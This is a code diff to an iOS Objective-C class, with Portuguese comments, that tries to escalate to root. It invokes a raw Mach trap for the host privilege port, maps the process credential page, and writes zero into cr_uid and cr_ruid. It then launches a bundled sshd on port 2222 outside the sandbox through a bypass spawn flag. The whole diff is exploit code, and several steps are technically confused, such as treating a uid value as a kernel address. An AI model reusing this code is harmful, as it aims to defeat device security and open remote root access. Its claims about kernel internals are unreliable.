@@ -6,8 +6,10 @@
 #include <mach/mach.h>
 #include <sys/wait.h>
 
-// Definição da flag de bypass de sandbox para o spawn
+// Definições de sistema para iOS 26.4
 #define POSIX_SPAWN_FOR_SANDBOX 0x4000
+// Número histórico do trap para host_get_priv_port no XNU
+#define MACH_TRAP_HOST_GET_PRIV_PORT -11 
 
 @interface KernelBridge : NSObject <WKScriptMessageHandler>
 @property (nonatomic, strong) WKWebView *webView;
@@ -28,27 +30,32 @@
     });
 }
 
-- (void)executePhysicalPPLBypass {
-    [self log:@"⚡ Resolvendo host_get_priv_port dinamicamente..."];
-
-    // 1. RESOLVER FUNÇÃO PRIVADA (Bypass Linker Error)
-    typedef kern_return_t (*host_get_priv_port_ptr)(mach_port_t, mach_port_t *);
-    host_get_priv_port_ptr host_get_priv_port = (host_get_priv_port_ptr)dlsym(RTLD_DEFAULT, "host_get_priv_port");
-
-    if (!host_get_priv_port) {
-        [self log:@"❌ Erro: Função host_get_priv_port não encontrada no iOS."];
-        return;
-    }
-
+// 1. OBTENÇÃO DA PORTA PRIVILEGIADA VIA SYSCALL (Bypass dlsym erro)
+- (mach_port_t)get_host_priv_direct {
     mach_port_t host_priv = MACH_PORT_NULL;
-    kern_return_t kr_host = host_get_priv_port(mach_host_self(), &host_priv);
+    // No ARM64, chamamos o trap diretamente
+    // O retorno de um Mach Trap é o próprio kern_return_t
+    kern_return_t kr = (kern_return_t)syscall(MACH_TRAP_HOST_GET_PRIV_PORT, mach_host_self(), &host_priv);
+    
+    if (kr == KERN_SUCCESS && MACH_PORT_VALID(host_priv)) {
+        return host_priv;
+    }
+    return MACH_PORT_NULL;
+}
 
-    if (kr_host != KERN_SUCCESS || !MACH_PORT_VALID(host_priv)) {
-        [self log:[NSString stringWithFormat:@"❌ Erro host_priv: %d (Acesso Negado)", kr_host]];
+- (void)executePhysicalPPLBypass {
+    [self log:@"⚡ Invocando Mach Trap -11 (host_priv)..."];
+
+    mach_port_t host_priv = [self get_host_priv_direct];
+
+    if (!MACH_PORT_VALID(host_priv)) {
+        [self log:@"❌ Erro: Trap negado. O Kernel bloqueou a porta privilégio."];
         return;
     }
 
-    // 2. LOCALIZAR PROCESSO E CREDENCIAIS
+    [self log:@"✅ host_priv obtida! Localizando ucred..."];
+
+    // 2. LOCALIZAR ENDEREÇO DAS CREDENCIAIS (UCRED)
     int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
     struct kinfo_proc kp;
     size_t len = sizeof(kp);
@@ -58,26 +65,32 @@
     uint64_t ucred_vaddr = (uint64_t)kp.kp_eproc.e_ucred.cr_uid;
     uint32_t root_val = 0;
 
-    // 3. MAPEAMENTO FÍSICO (Bypass PPL)
+    // 3. MAPEAMENTO FÍSICO E SOBREESCRITA (Bypass PPL)
     vm_address_t page_addr = 0;
-    // Mapeia a memória física diretamente usando a porta privilegiada
+    // vm_map usando a porta privilégio para ignorar restrições de escrita virtual
     kern_return_t kr = vm_map(mach_task_self(), &page_addr, 4096, 0, VM_FLAGS_ANYWHERE, host_priv, ucred_vaddr & ~0xFFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
 
     if (kr == KERN_SUCCESS) {
+        // Cálculo do offset dentro da página mapeada
         uint32_t *phys_ptr = (uint32_t *)(page_addr + (ucred_vaddr & 0xFFF));
-        *phys_ptr = root_val;     // cr_uid = 0
-        *(phys_ptr + 1) = root_val; // cr_ruid = 0
         
-        [self log:@"💎 Sucesso: Memória Física alterada!"];
+        // Patch de Root Direto na Memória Física
+        *phys_ptr = root_val;         // cr_uid = 0
+        *(phys_ptr + 1) = root_val;     // cr_ruid = 0 (proximo campo)
+        
+        [self log:@"💎 Memória Física alterada. Validando UID..."];
         vm_deallocate(mach_task_self(), page_addr, 4096);
+    } else {
+        [self log:[NSString stringWithFormat:@"❌ Falha no vm_map: %d", kr]];
+        return;
     }
 
-    // 4. VERIFICAÇÃO E LANÇAMENTO DO SSHD
+    // 4. LANÇAMENTO DO SSHD
     if (getuid() == 0) {
-        [self log:@"👑 <b>ROOT SUCESSO!</b> Invocando SSHD..."];
+        [self log:@"👑 <b>ROOT ATIVO!</b>"];
         [self launchSshd];
     } else {
-        [self log:[NSString stringWithFormat:@"❌ Falha: UID ainda é mobile (Error: %d)", kr]];
+        [self log:@"❌ Falha: O Kernel reverteu a escrita física (PPL Guard)."];
     }
 }
 
@@ -86,12 +99,13 @@
     NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
     
     if (!sshdPath) {
-        [self log:@"❌ Erro: Binário sshd não encontrado no Bundle."];
+        [self log:@"❌ Erro: 'sshd' não encontrado no App Bundle."];
         return;
     }
 
     posix_spawnattr_t attr;
     posix_spawnattr_init(&attr);
+    // Flag 0x4000 essencial para spawn fora do sandbox em iOS moderno
     short flags = POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX;
     posix_spawnattr_setflags(&attr, flags);
 
@@ -108,9 +122,9 @@
     int status = posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ);
 
     if (status == 0) {
-        [self log:[NSString stringWithFormat:@"✅ SSHD ONLINE! PID: %d porta 2222", pid]];
+        [self log:[NSString stringWithFormat:@"✅ <b>SSHD ONLINE!</b> PID: %d porta 2222", pid]];
     } else {
-        [self log:[NSString stringWithFormat:@"❌ Erro Spawn: %d (%s)", status, strerror(status)]];
+        [self log:[NSString stringWithFormat:@"❌ Spawn Falhou: %d (%s)", status, strerror(status)]];
     }
     
     posix_spawnattr_destroy(&attr);
